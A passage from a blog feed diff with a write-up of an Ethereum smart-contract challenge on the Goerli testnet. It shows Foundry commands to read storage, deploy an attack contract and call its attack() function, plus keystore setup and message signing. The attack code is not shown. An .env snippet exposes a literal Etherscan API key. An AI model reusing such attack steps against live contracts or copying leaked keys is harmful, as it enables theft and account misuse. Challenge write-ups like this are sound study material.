+&lt;p&gt;Printing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;console.log(challenge.winners(31))&lt;/code&gt; confirmed my &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;player&lt;/code&gt; address had been added to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;winner&lt;/code&gt; array. I know the index of the last element should be 31 by checking the value at the first storage slot of the challenge contract, since &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;winners&lt;/code&gt; is the first declared variable of the challenge contract. For dynamic arrays, the storage slot corresponding to the variable stores the number of elements in the array (see &lt;a href=&quot;https://docs.soliditylang.org/en/v0.8.17/internals/layout_in_storage.html#mappings-and-dynamic-arrays&quot;&gt;storage layout docs&lt;/a&gt;).&lt;/p&gt;
+
+&lt;p&gt;To query the first storage slot of the challenge contract:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cast storage 0xcD7AB80Da7C893f86fA8deDDf862b74D94f4478E 0 --block 7382818&lt;/code&gt; , which returns &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x000000000000000000000000000000000000000000000000000000000000001f&lt;/code&gt; = 31.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h2 id=&quot;deploy-to-goerli-testnet&quot;&gt;Deploy to Goerli testnet&lt;/h2&gt;
+
+&lt;p&gt;Command: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;forge create src/Attack.sol:MyAttack --verify&lt;/code&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Beforehand, define and source &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.env&lt;/code&gt; file with keystore path (for sender authentication, and Etherscan API for verifying contracts). See &lt;a href=&quot;#create-keystore-account-in-geth&quot;&gt;section below&lt;/a&gt; on how to create keystores
+    &lt;div class=&quot;language-solidity highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;//source this .env file
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ETHERSCAN_API_KEY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ZSED47H9XHGGHAJT86FXPC1Y57YGRM1H3R&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;ETH_KEYSTORE&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;home&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chihiro&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ethereum&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;goerli&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;keystore&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UTC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2022&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;08&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;07&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;T23&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;58&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mf&quot;&gt;04.686858789&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Z&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;--&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;08e1&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eb1a25e7389488016a25cacb51d169cd27a3&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;ETH_RPC_URL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;http://localhost:3333&apos;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//running Goerli node
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Appending &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;—verify&lt;/code&gt; flag adds Etherscan contract verifcation. Thus, anyone can read the contract source code on Etherscan, which has been verified to compile to the bytecode (ie. low level machine language executed by the EVM, which uniquely defines the logic for how contract behaves).&lt;/li&gt;
+  &lt;li&gt;Set &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;solc = &apos;0.8.10&apos;&lt;/code&gt; in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;foundry.toml&lt;/code&gt; to match the Solidity version used by my contracts.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Deployed the &lt;a href=&quot;https://goerli.etherscan.io/address/0x6d4b8b1025f758f41F440b511A10d9faa4B50384#code&quot;&gt;Attack contract&lt;/a&gt; with verified code at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x6d4b8b1025f758f41F440b511A10d9faa4B503841&lt;/code&gt;.&lt;/p&gt;
+
+&lt;h3 id=&quot;create-keystore-account-in-geth&quot;&gt;Create keystore account in Geth&lt;/h3&gt;
+&lt;p&gt;A keystore can be understood as a private key encrypted by a password. To write anything on-chain, we need a keystore (or a raw private key).&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;In the machine running the Geth node, create an account via &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;geth --goerli account new&lt;/code&gt;
+    &lt;ul&gt;
+      &lt;li&gt;generates keystores at &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/chihiro/.ethereum/goerli/keystore&lt;/code&gt;&lt;/li&gt;
+      &lt;li&gt;REMEMBER THE PASSWORD! We are prompted for it any time we use the keystore&lt;/li&gt;
+      &lt;li&gt;note down the address. For example, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x08e1eb1a25e7389488016a25cacb51d169cd27a3&lt;/code&gt; is mine&lt;/li&gt;
+      &lt;li&gt;To confirm its creation, attach to the Geth Javascript console: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;geth --goerli attach&lt;/code&gt; : now we should see the newly created account when calling &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;eth.accounts&lt;/code&gt;&lt;/li&gt;
+      &lt;li&gt;Keystore is generated in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/chihiro/.ethereum/goerli/keystore&lt;/code&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Next, request some Goerli ETH from Alchemy faucet, or Paradigm’s faucet&lt;/li&gt;
+  &lt;li&gt;As an alternative to using your own Geth node and corresponding keystore, you can instead specify an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ETH_RPC_URL&lt;/code&gt; from a node provider like Alchemy and provide explicit private keys
+    &lt;ul&gt;
+      &lt;li&gt;If you choose to specify explicit private keys, it requires adding &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;--private-key $PRIVATE_KEY&lt;/code&gt; to Foundry commands that write to the blockchain, e.g. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;forge create&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cast send&lt;/code&gt;, etc.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;div class=&quot;language-solidity highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;//source this .env file
+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ETHERSCAN_API_KEY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;lt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;YOUR_API_KEY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;ETH_RPC_URL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;https://eth-goerli.g.alchemy.com/v2/&amp;lt;API_KEY&amp;gt;&apos;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;PRIVATE_KEY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HEX&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CHAR&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PRIVKEY&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;ETH_FROM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&amp;lt;&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;40&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HEX&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CHAR&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ADDRESS&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;using-cast-to-read--interact--sign&quot;&gt;Using Cast to Read + Interact + Sign&lt;/h2&gt;
+
+&lt;p&gt;Cast has a variety of use-cases.&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;Write&lt;/strong&gt;: publish tx: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cast send &amp;lt;contract_addr&amp;gt; &quot;fn()&quot;&lt;/code&gt;&lt;br /&gt;
+For example, to finish our attack above, we call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;attack()&lt;/code&gt; on the deployed attack contract. &lt;br /&gt;
+    &lt;ul&gt;
+      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cast send &amp;lt;attack_addr&amp;gt; &quot;attack()&quot; --gas-limit 120000&lt;/code&gt;&lt;/li&gt;
+      &lt;li&gt;Ran out of gas at first, needed to add gas-limit. Possible that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cast estimate &amp;lt;attack_addr&amp;gt; &quot;attack()&quot;&lt;/code&gt; is off sometimes (which it runs implicitly).&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Read&lt;/strong&gt;: read on-chain data (no gas required, and no private key needed) &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cast call &amp;lt;contract addr&amp;gt; “fn(input_type)(output_type)”&lt;/code&gt;&lt;br /&gt;
+To confirm we completed the challenge, we verify that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x08E1Eb1A25E7389488016a25CAcb51D169cd27a3&lt;/code&gt; is on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;winners&lt;/code&gt; array written permanently on the blockchain. &lt;br /&gt;
+    &lt;ul&gt;
+      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cast call 0xcD7AB80Da7C893f86fA8deDDf862b74D94f4478E &quot;winners(uint256)(address)&quot; 24&lt;/code&gt;&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Sign:&lt;/strong&gt; we can also sign messages off-chain. For instance, below I prove that I (Carlos) am the owner of the address inside the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;winner&lt;/code&gt; array.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;For any judge to verify the validity of a signature (e.g. via Etherscan Verified Signatures &lt;a href=&quot;https://etherscan.io/verifiedSignatures#&quot;&gt;https://etherscan.io/verifiedSignatures#&lt;/a&gt;): we require 3 pieces of data.&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Signer Address (ie. address in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;winner&lt;/code&gt; array): &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x08E1Eb1A25E7389488016a25CAcb51D169cd27a3&lt;/code&gt;&lt;/li&gt;
+  &lt;li&gt;Message: “My name is Carlos Xu, and I completed the challenge at 0xd101a9081dc733f1e2cd51454cbed7e3e2c8644dde049ea22d49bc036af3988d”&lt;/li&gt;
+  &lt;li&gt;Signature: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x85c606541bddf728111f93ba5e70310133fe5b06d5f51882508dcdaaf0cb969c083f0864e8c9f8ff6d1cdc48892bc8fc39f60cb41512145630d1a97d12db79c31c&lt;/code&gt;
+    &lt;ul&gt;
+      &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cast wallet sign &amp;lt;message&amp;gt;&lt;/code&gt; returns the signature&lt;/li&gt;
+      &lt;li&gt;Only someone with access to keystore of the signer address could have produced this signature corresponding to the message. However, anyone can verify this signature to be valid.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;If anyone else (with a different private key and hence signer address) tries to generate a signature on the same message string, the signature will be entirely different. 
+Thus, the above suffices to prove that the owner of the private key for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0x08E1Eb1A25E7389488016a25CAcb51D169cd27a3&lt;/code&gt; wrote the above message claiming to be Carlos.&lt;/p&gt;</content>
+
+      
+      
+      
+      
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+      
+    </entry>
+  
   
   
     <entry>
